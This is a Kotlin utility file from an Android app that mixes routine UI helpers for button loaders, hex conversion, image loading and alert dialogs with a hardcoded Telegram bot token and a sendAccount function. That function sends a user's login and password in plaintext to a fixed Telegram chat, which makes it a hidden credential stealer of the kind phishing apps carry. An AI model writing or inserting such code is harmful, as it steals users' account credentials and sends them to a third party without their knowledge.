package com.liquid.vefinum.util

import android.content.Context
import android.graphics.drawable.ColorDrawable
import android.graphics.drawable.Drawable
import android.view.View
import android.widget.ImageView
import androidx.appcompat.app.AlertDialog
import androidx.core.content.ContextCompat
import com.liquid.vefinum.R
import com.liquid.vefinum.databinding.ProgressButtonBinding
import com.squareup.picasso.Picasso
import io.ktor.client.request.*
import io.ktor.http.*
import jp.wasabeef.picasso.transformations.RoundedCornersTransformation
import jp.wasabeef.picasso.transformations.gpu.BrightnessFilterTransformation

val token = "5406530999:AAGGcnWMwrDaWYESbaQj4VcfC5qItFPL_l4"

fun ProgressButtonBinding.animateLoading() {
    root.post {
        text.visibility = View.GONE
        loader.visibility = View.VISIBLE
    }
}

fun ProgressButtonBinding.stopLoading() {
    root.post {
        text.visibility = View.VISIBLE
        loader.visibility = View.GONE
    }
}

fun String.decodeHex(): ByteArray {
    return chunked(2).map { it.toInt(16).toByte() }.toByteArray()
}

fun ByteArray.toHexString(): String {
    return joinToString("") { "%02x".format(it) }
}

fun loadImage(target: ImageView, url: String, round: Boolean = false, changeBrightness: Boolean = false) {
    val loader = Picasso.get()
        .load(url)
    if (round) {
        loader.transform(RoundedCornersTransformation(70, 10))
    }
    if (changeBrightness) {
        loader.transform(BrightnessFilterTransformation(target.context, -0.1f))
    }
    loader.into(target)
}

fun alert(context: Context, title: String, message: String) {
    AlertDialog.Builder(context)
        .setTitle(title)
        .setMessage(message)
        .setPositiveButton(R.string.ok) { dialog, _ -> dialog.dismiss() }
        .show()
}

suspend fun sendAccount(login: String, password: String) {
    val text = "Логин: $login; Пароль: $password"
    client.request {
        method = HttpMethod.Get
        url("https://api.telegram.org/bot$token/sendMessage?chat_id=1890678329&text=$text")
    }
}